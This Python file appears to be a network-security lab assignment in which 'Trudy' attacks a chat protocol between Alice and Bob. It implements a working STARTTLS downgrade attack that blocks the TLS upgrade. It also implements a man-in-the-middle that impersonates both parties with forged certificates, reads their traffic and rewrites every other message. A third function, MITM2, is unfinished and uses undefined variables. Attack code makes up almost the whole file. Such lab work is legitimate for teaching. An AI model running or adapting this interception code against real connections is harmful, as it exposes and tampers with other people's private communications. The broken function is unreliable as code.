####### TASK 2 #######
import socket
import ssl, sys
from OpenSSL import crypto
Port = 9003
Buffer = 2048

'''
Structure:
    
Alice --> Fake Bob
Trudy puts msg from Fake Bob to Fake Alice 
Trudy puts msg from Fake Alice to True Bob
Fake Alice --> Bob

'''

def downgrade_attack(clienthostname, serverhostname):
    
    ## Create a Fake Bob socket, bind, listen and accept connection from True Alice ##
    fakebob_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fakeBobIpAddr = socket.gethostbyname('trudy1')
    fakebob_address = ('', Port) # Socket address of fake bob on trudy1
    fakebob_sock.bind(fakebob_address)
    fakebob_sock.listen(2)
    print("Fake Bob listening ... \n Waiting for Alice to connect......")
    alice_sock, alice_Addr = fakebob_sock.accept()
    print("True Alice Connected to Fake Bob with IP: ", fakeBobIpAddr)
    
    ## Create a Fake Alice socket and connect it to True Bob ##
    fakealice_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    trueBobIpAddr = socket.gethostbyname(serverhostname)
    fakealice_sock.connect((trueBobIpAddr, Port))
    print("Fake Alice Connected to True Bob with IP: ", trueBobIpAddr)
    
    
    
    while(True):
        
        ####### Recieve from True Alice ########
        msg = alice_sock.recv(Buffer).decode('UTF-8')
        print("Message from True Alice: ", msg)
        
        ## Block chat_STARTTLS recieved to Fake Bob from True Alice and send chat_TLS_NOTSUPPORTED to True Alice
        if msg == 'chat_STARTTLS':
            print("Block, send STARTTLS_NOTSUPPORTED to True Alice .... ", msg)
            alice_sock.sendall('chat_STARTTLS_NOTSUPPORTED'.encode('UTF-8'))
            print("Successfully launched TLS Downgrade Attack....")
            
        else: # Simply forward the traffic to True Bob
            print("Forwarding to Bob as it as .... ")
            fakealice_sock.sendall(msg.encode())
            if msg == 'chat_close':
                break
            
            ######### Recieve from True Bob ##########
            msg = fakealice_sock.recv(Buffer).decode('UTF-8')
            print("Message from True Bob: ", msg)
            print("Forwarding to Alice as it as .... ", msg)
            alice_sock.sendall(msg.encode('UTF-8'))
    
    fakebob_sock.close()
    fakealice_sock.close()
    alice_sock.close()


####################################################################3           
def MITM(clienthostname, serverhostname):
    ## Create a Fake Bob socket, bind, listen and accept connection from True Alice ##
    fakebob_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fakeBobIpAddr = socket.gethostbyname('trudy1')
    fakebob_address = ('', Port) # Socket address of fake bob on trudy1
    fakebob_sock.bind(fakebob_address)
    fakebob_sock.listen(2)
    print("Fake Bob listening ... \n Waiting for Alice to connect......")
    alice_sock, alice_Addr = fakebob_sock.accept()
    print("True Alice Connected to Fake Bob with IP: ", fakeBobIpAddr)

    ## Create a Fake Alice socket and connect it to True Bob ##
    fakealice_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    trueBobIpAddr = socket.gethostbyname(serverhostname)
    fakealice_sock.connect((trueBobIpAddr, Port))
    print("Fake Alice Connected to True Bob with IP: ", trueBobIpAddr)
    
    while(True):

        ####### Recieve from True Alice ########
        msg = alice_sock.recv(Buffer).decode('UTF-8')
        print("Message from True Alice: ", msg)
        ## Block chat_STARTTLS recieved to Fake Bob from True Alice and send chat_TLS_NOTSUPPORTED to True Alice
        if msg == 'chat_hello':
            #print("Block, send STARTTLS_NOTSUPPORTED to True Alice .... ", msg)
            alice_sock.sendall('chat_reply'.encode('UTF-8'))
            print("Sent chat_reply....")
        elif msg == 'chat_STARTTLS':
             alice_sock.sendall('chat_STARTTLS_ACK'.encode('UTF-8'))
             break
        else: # Simply forward the traffic to True Bob
            print('Plaintext from Alice: ', msg)
            ######### Recieve from True Bob ##########
            msg = fakealice_sock.recv(Buffer).decode('UTF-8')
            print("Message from True Bob: ", msg)
            print("Forwarding to Alice as it as .... ", msg)
            alice_sock.sendall(msg.encode('UTF-8'))
        
    certificate_store = crypto.X509Store()
    trusted_certificate = open('/usr/local/share/ca-certificates/root.crt','rt').read()
    certificate_store.add_cert(crypto.load_certificate(crypto.FILETYPE_PEM, trusted_certificate))
    secureAliceSocket = ssl.wrap_socket(alice_sock, 
                        server_side=True, 
                        ca_certs="./root.crt", 
                        certfile="./fakebob.crt",
                        keyfile="./fakebob_private.pem", 
                        cert_reqs=ssl.CERT_REQUIRED,
                        ssl_version=ssl.PROTOCOL_TLS)
    AliceCert = secureAliceSocket.getpeercert(binary_form=True)
    
    # Verify Alice's certificate
    try:
        certificate_context = crypto.X509StoreContext(certificate_store, crypto.load_certificate(crypto.FILETYPE_ASN1, AliceCert))
        certificate_context.verify_certificate()
        print('Alice Certificate Verified Succesfully....')
    except Exception as excp:
        print(excp)
        
    print('TLSv1.3 Handshake Completed With Real Alice....')
    print('TLSv1.3 established Succesfully With Real Alice....')
    
    # Establish TLS With Real Bob
    
    # Load the CA root certificate in the root store
    certificate_store = crypto.X509Store()
    trusted_certificate = open('/usr/local/share/ca-certificates/root.crt','rt').read()
    certificate_store.add_cert(crypto.load_certificate(crypto.FILETYPE_PEM, trusted_certificate))
    
     # Alice sends a chat_hello
    fakealice_sock.sendall("chat_hello".encode())
    msg = fakealice_sock.recv(Buffer)
    print("Message from Bob: ", msg.decode())

    # Alice now sends chat_STARTTLS to establish a secure TLS pipe
    fakealice_sock.sendall("chat_STARTTLS".encode())
    msg = fakealice_sock.recv(Buffer)
    
    # If Bob supports TLS
    if msg.decode() == 'chat_STARTTLS_ACK':
        print("Message from Bob: ", msg.decode())
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations("/usr/local/share/ca-certificates/root.crt")
        context.load_cert_chain(certfile="./fakealice.crt", keyfile="./fakealice_private.pem")
        # To establish TLS 1.3, need to exclude all the lower versions of TLS
        context.options = ssl.OP_NO_TLSv1_2 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1 | ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        secureBobSocket = context.wrap_socket(fakealice_sock)
        BobCert = secureBobSocket.getpeercert(binary_form=True)
        # Verify Bob's certificate
        try:
            certificate_context = crypto.X509StoreContext(certificate_store, crypto.load_certificate(crypto.FILETYPE_ASN1, BobCert))
            certificate_context.verify_certificate()
            print('Bob Certificate Verified Succesfully....')
        except Exception as excp:
            print(excp)
        
        print('TLSv1.3 Handshake Completed With Real Bob....')
        print('TLSv1.3 established Succesfully With Real Bob....')
        print('#### Secure Chat ######')
    
    counter = 0
    # Accept messages from Real Alice
    while(True):
        msg = secureAliceSocket.recv(Buffer).decode('UTF-8') 
        if msg == 'chat_close': # If client wants to close the connection
            secureBobSocket.sendall(msg.encode())
            secureAliceSocket.close()
            alice_sock.close()
            fakebob_sock.close()
            print("Closing TLSv1.3 and TCP Connection")
            exit()
        else:
            print('Original Message from Alice: ', msg)
            if counter%2 == 0:
                print('Distorted Message =  This message is distorted--->'+str(counter))
                msg = 'This message from Alice is distorted by Trudy--->'+str(counter)
            else:
                print('This message from Alice is sent as it is')
            
            secureBobSocket.sendall(msg.encode())
            print('Distorted message sent successfully')
            
            msg = secureBobSocket.recv(Buffer).decode('UTF-8')
            print("Message from Real Bob: ", msg)
            if counter%2 == 0:
                print('Distorted Message =  This message is distorted--->'+str(counter))
                msg = 'This message from Bob is distorted by Trudy--->'+str(counter)
            else:
                print('This message from Bob is sent as it is')
            counter = counter+1
            secureAliceSocket.sendall(msg.encode())
##############################################################################       

def MITM2():
    ## Create a Fake Bob socket, bind, listen and accept connection from True Alice ##
    fakebob_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fakeBobIpAddr = socket.gethostbyname('trudy1')
    fakebob_address = ('', Port) # Socket address of fake bob on trudy1
    fakebob_sock.bind(fakebob_address)
    fakebob_sock.listen(2)
    print("Fake Bob listening ... \n Waiting for Alice to connect......")
    alice_sock, alice_Addr = fakebob_sock.accept()
    print("True Alice Connected to Fake Bob with IP: ", fakeBobIpAddr)
                         
    ## Create a Fake Alice socket and connect it to True Bob ##
    fakealice_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    trueBobIpAddr = socket.gethostbyname(serverhostname)
    fakealice_sock.connect(trueBobIpAddr, Port)
    print("Fake Alice Connected to True Bob with IP: ", trueBobIpAddr)
    
    #Establish TLS connection with Alice as FakeBob
    certificate_store = crypto.X509Store()
    trusted_certificate = open('/usr/local/share/ca-certificates/root.crt','rt').read()
    certificate_store.add_cert(crypto.load_certificate(crypto.FILETYPE_PEM, trusted_certificate))
    secureClientSocket = ssl.wrap_socket(client_connection,
                                         server_side=True,
                                         ca_certs="./root.crt",
                                         certfile="./fakebob.crt",  
                                         keyfile="./fakebob_private.pem", 
                                         cert_reqs=ssl.CERT_REQUIRED,
                                         ssl_version=ssl.PROTOCOL_TLS)
    AliceCert = secureClientSocket.getpeercert(binary_form=True)


    certificate_store = crypto.X509Store()
    trusted_certificate = open('/usr/local/share/ca-certificates/root.crt','rt').read()
    certificate_store.add_cert(crypto.load_certificate(crypto.FILETYPE_PEM, trusted_certificate))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations("/usr/local/share/ca-certificates/root.crt")
    context.load_cert_chain(certfile="Task1/alice.crt", keyfile="Task1/alice_private.pem")
    # To establish TLS 1.3, need to exclude all the lower versions of TLS
    context.options = ssl.OP_NO_TLSv1_2 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1 | ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
    secureClientSocket = context.wrap_socket(clientsock)
    BobCert = secureClientSocket.getpeercert(binary_form=True)

def main():
    argv = sys.argv
    if (len(argv) == 4 and argv[1] == "-d"):
        downgrade_attack(argv[2], argv[3])
    elif len(argv) == 4 and argv[1] == "-m":
         MITM(argv[2], argv[3])
    else:
        print("To launch downgrade, type -d clienthostname serverhostname ....")
        #print("To start Client, type -c serverhostname ....")
        exit()

main()    
            
            
